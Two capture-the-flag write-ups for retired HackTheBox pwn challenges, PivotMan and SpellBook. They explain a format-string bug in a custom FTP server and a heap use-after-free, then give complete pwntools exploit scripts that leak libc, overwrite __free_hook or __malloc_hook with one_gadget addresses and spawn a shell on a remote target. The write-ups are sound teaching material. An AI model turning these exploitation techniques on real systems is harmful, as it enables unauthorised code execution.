item.title: PivotMan - HackTheBox
item.content:encoded:
• Catergory: Pwn
  • Status: Retired

Description​

Pivotman is a easy rated challenge from HackTheBox. Its a custom ftp server, which has a unique FTP command called BKDR which suffers from format string vulnerabilty. From that vulnerability, we'll leak libc address, calculate base address, and overwrite __free_hook with one_gadget in order to pop a shell.

Decompilation​

There are default commands of FTP but we need login first, checking the decompiled part where it checks compares for username and password, we get both of them works with ;).

And this does work.

Now you can find all of the commands from the decompiler itself, or since you already know most of the ftp commands just happens to be 4 characters, string and then grep for string equals to 4 characters.

» strings chall| grep '^....$'
u+UH
< t
<Au1
<Iu1
USER
PASS
RETR
STOR
STOU
APPE
REST
RNFR
RNTO
ABOR
DELE
CDUP
LIST
NLST
SITE
STAT
HELP
NOOP
TYPE
PASV
PORT
SYST
QUIT
MDTM
SIZE
BKDR
Done
stat
puts
atoi
free
.bss

Now BKDR does sound like backdoor, lets find a reference to it in decompiler and see how its working.

and that does look like a format string vulnerability since the buffer is straight being passed to vsnprintf. Testing theory confirms it.

Exploit​

Now let's start with a wrapper script to fuzz for address that could be potentially libc's address. After few hits, 2739 seems to have constant offset to the libc's base.

exploit.py
from pwn import *
import sys

e = context.binary = ELF('./chall')
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

fuzz_payload = lambda x : p.sendlineafter(b'230 User logged in proceed \r\n', x.encode())

for i in range(2700, 2800):
    p = e.process()
    p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
    p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
    fuzz_payload(f"BKDR %{i}$p")
    p.recvuntil(b"431136 BKDR ")
    response = p.recvuntil(b" \r\n", drop=True)
    if b"0x7f" in response:
        print(f"Possible libc address at index {i} value {response}")

p.interactive()

Similarly to find from where our buffer starts:

exploit.py
for i in range(1000, 1100):
    p = e.process()
    p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
    p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
    fuzz_payload(f"BKDR AAAAAAAA %{i}$p")
    p.recvuntil(b"431136 BKDR ")
    response = p.recvuntil(b" \r\n", drop=True)
    if b"0x41" in response:
        print(f"Our buffer starts from {i} value {response}")

For RCE, I'll overwrite __free_hook since free is called at the end of the function.

» one_gadget libc.so.6
0xde78c execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xde78f execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xde792 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

Solve Script​

exploit.py
from pwn import *
import sys

e = context.binary = ELF('./chall')
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

fmt_payload = lambda x : p.sendlineafter(b'230 User logged in proceed \r\n', x)
fuzz_payload = lambda x : p.sendlineafter(b'230 User logged in proceed \r\n', x.encode())

"""
for i in range(2700, 2800):
    p = e.process()
    p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
    p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
    fuzz_payload(f"BKDR %{i}$p")
    p.recvuntil(b"431136 BKDR ")
    response = p.recvuntil(b" \r\n", drop=True)
    if b"0x7f" in response:
        print(f"Possible libc address at index {i} value {response}")
"""    

"""
for i in range(1000, 1100):
    p = e.process()
    p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
    p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
    fuzz_payload(f"BKDR AAAAAAAA %{i}$p")
    p.recvuntil(b"431136 BKDR ")
    response = p.recvuntil(b" \r\n", drop=True)
    if b"0x41" in response:
        print(f"Our buffer starts from {i} value {response}")
"""

p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
fmt_payload(b"BKDR %2739$p")
p.recvuntil(b"431136 BKDR ")
libc_leak = int(p.recvuntil(b" \r\n", drop=True), 16)
log.info(f"libc leak : {hex(libc_leak)}")
libc.address = libc_leak - 0x28565
log.info(f"libc base leak : {hex(libc.address)}")

"""
0xde78c execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xde78f execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xde792 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

payload = fmtstr_payload(1031, {libc.sym.__free_hook : (libc.address + 0xde78c)}, numbwritten=12)
p.sendline(b"BKDR " + payload)

#gdb.attach(p)
p.interactive()

item.title: SpellBook - HackTheBox
item.content:encoded:
• Category: Pwn
  • Status: Retired

Description​

Spellbook is a medium rated challenge from HackTheBox. Its a classic heap challenge where you have add, edit, delete and show functions. On delete function, the free'd chunk is not being nulled, which leads to use-after-free case and a heap overflow in edit function Not used in this exploit

Decompilation​

The main function looks like:

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax

  setup();
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        show();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
    if ( v3 == 3 )
    {
      edit();
    }
    else
    {
      if ( v3 != 4 )
      {
LABEL_13:
        printf("\n%s[-] You are not a wizard! You are a muggle!\n\n", "\x1B[1;31m");
        exit(22);
      }
      delete();
    }
  }
}

add function:

void __fastcall add()
{
  int size; // [rsp+4h] [rbp-5Ch]
  size_t idx; // [rsp+8h] [rbp-58h]
  spl *spell; // [rsp+10h] [rbp-50h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 )
  {
    spell = (spl *)malloc(0x28uLL);
    printf(aInsert);
    spell->type[(int)(read(0, spell, 0x17uLL) - 1)] = 0;
    printf(aInsert_0);
    size = read_num();
    if ( size <= 0 || size > 1000 )
    {
      printf("\n%s[-] Such power is not allowed!\n", "\x1B[1;31m");
      exit(290);
    }
    spell->power = size;
    spell->sp = (char *)malloc(spell->power);
    printf(aEnter);
    spell->sp[(int)read(0, spell->sp, size - 1) - 1] = 0;
    table[idx] = spell;
    printf(aS_0, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

Summary:

  • Can allocate upto 10 chunks
  • Maximum size for the chunk is 1000

show function:

void __fastcall show()
{
  size_t idx; // [rsp+0h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    printf(asc_19A8);
    printf(table[idx]->type);
    printf(asc_19C6);
    printf(table[idx]->sp);
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

There is also a format string vulnerability, which can be used to get libc leak, but i'll be doing with unsorted bin.

edit function:

void __fastcall edit()
{
  size_t idx; // [rsp+8h] [rbp-18h]
  spl *new_spell; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    new_spell = table[idx];
    printf(aNew);
    new_spell->type[(int)(read(0, new_spell, 0x17uLL) - 1)] = 0;
    printf(aNew_0);
    new_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;
    printf(aS_1, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

The bug lies at the following line, again not using the vulnerability.

new_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;

and finally delete function:

void __fastcall delete()
{
  size_t idx; // [rsp+8h] [rbp-18h]
  spl *ptr; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    ptr = table[idx];
    free(ptr->sp);
    free(ptr);
    printf(aS_2, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

Here lies the bug that I'll be exploiting to pop a shell. It frees ptr->sp and ptr, but doesn't nulls it out, leading to use-after-free.

Exploit​

wrapper for calling the functions in python.

exploit.py
from pwn import *
import sys

e = ELF("./spellbook")
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

c = lambda x: p.sendlineafter(b">> ", str(x).encode())

def add(entry, types, power, data, shell=False):
    c(1)
    p.sendlineafter(b"entry: ", str(entry).encode())
    if shell:
        return
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b"power: ", str(power).encode())
    p.sendlineafter(b": ", data)

def show(idx):
    c(2)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.recvuntil(b"       : ")
    return p.recvuntil(b"\n", drop=True)

def edit(idx, types, data):
    c(3)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b": ", data)

def free(idx):
    c(4)
    p.sendlineafter(b"entry: ", str(idx).encode())

#gdb.attach(p)
p.interactive()

Let's get a unsorted bin leak and then move on with the actual exploit. Create a maximum size of a chunk that the program allows, create another to prevent top chunk consolidation.

exploit.py
add(0, b"X", 0x3e8, b"A")
add(1, b"X", 0x10, b"B")

free(0)

gdb.attach(p)
p.interactive()

Since there's use-after-free, we can view the idx 0 chunk to get a leak, and calculate libc's base address,

exploit.py
libc_leak = u64(show(0) + b"\x00\x00")
log.info(f"libc leak : { hex(libc_leak)} ")
libc.address = libc_leak - 0x3c4b78
log.info(f"libc base leak : { hex(libc.address)} ")

gdb.attach(p)
p.interactive()

Now we've defeated ASLR, we need to get a rce. Because of use-after-free, we can actually change the fd of the already free'd chunk to somewhere else. For now, I'll be changing the address to 0xdeadbeef. Let's setup similar scenario first.

exploit.py
add(2, b"X", 0x48, b"a")
add(3, b"X", 0x48, b"b")

free(2)
free(3)

Since we can still edit the Chunk 1's FD, try to change it to somewhere else.

exploit.py
edit(3, b"", p64(0xdeadbeef))

Now we can overwrite __free_hook with one_gadget, but that won't work since there is a size check in fastbins, https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3319. So we need to find a address before either of the hook whose size is similar to the size of the bin. The simple way is to find a size of 0x7f, do the exploit in the size of 0x68 which will be in

[0x70]: Chunk 2 -> __free_hook

Now generally there are no 0x7f fake size chunks before __free_hook but there are before __malloc_hook, so we'll be allocating before __malloc_hook

exploit.py
add(2, b"X", 0x68, b"a")
add(3, b"X", 0x68, b"b")

free(2)
free(3)

edit(3, b"", p64(libc.address + 0x3c4aed))

Bring to the head,

exploit.py
add(5, b"X", 0x68, b"B")

And now we allocate from the address, and overwrite with one_gadget ( can use system but one_gadget is life saver ).

» one_gadget glibc/libc.so.6
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
exploit.py
add(4, b"X", 0x68, b"X"*0x13 + p64(libc.address + 0x4527a))

And finally trigger the one_gadget with another malloc

exploit.py
add(5, b"", 0x0, b"", shell=True)

Solve Script​

exploit.py
from pwn import *
import sys

e = ELF("./spellbook")
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

c = lambda x: p.sendlineafter(b">> ", str(x).encode())

def add(entry, types, power, data, shell=False):
    c(1)
    p.sendlineafter(b"entry: ", str(entry).encode())
    if shell:
        return
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b"power: ", str(power).encode())
    p.sendlineafter(b": ", data)

def show(idx):
    c(2)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.recvuntil(b"       : ")
    return p.recvuntil(b"\n", drop=True)
    
def edit(idx, types, data):
    c(3)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b": ", data)

def free(idx):
    c(4)
    p.sendlineafter(b"entry: ", str(idx).encode())

add(0, b"X", 0x3e8, b"A")
add(1, b"X", 0x10, b"B")

free(0)
libc_leak = u64(show(0) + b"\x00\x00")
log.info(f"libc leak : { hex(libc_leak)} ")
libc.address = libc_leak - 0x3c4b78
log.info(f"libc base leak : { hex(libc.address)} ")

add(2, b"X", 0x68, b"a")
add(3, b"X", 0x68, b"b")

free(2)
free(3)

edit(3, b"", p64(libc.address + 0x3c4aed))

add(5, b"X", 0x68, b"B")
add(4, b"X", 0x68, b"X"*0x13 + p64(libc.address + 0x4527a))
add(5, b"", 0x0, b"", shell=True)

#gdb.attach(p)
p.interactive()
